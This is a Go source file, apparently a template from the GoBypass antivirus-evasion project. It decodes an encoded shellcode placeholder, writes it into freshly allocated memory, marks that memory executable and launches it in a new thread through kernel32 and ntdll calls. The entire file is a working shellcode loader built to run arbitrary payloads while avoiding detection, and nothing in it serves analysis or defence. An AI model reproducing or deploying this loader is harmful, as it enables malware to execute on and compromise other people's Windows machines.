package main

import (
	"encoding/hex"
	"github.com/EmYiQing/GoBypass/encode"
	"golang.org/x/sys/windows"
	"unsafe"
)

func main() {
	code, _ := hex.DecodeString(encode.Decode("__SHELLCODE__"))
	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(code)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
	var oldProtect uint32
	_ = windows.VirtualProtect(addr, uintptr(len(code)), windows.PAGE_EXECUTE_READ, &oldProtect)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}
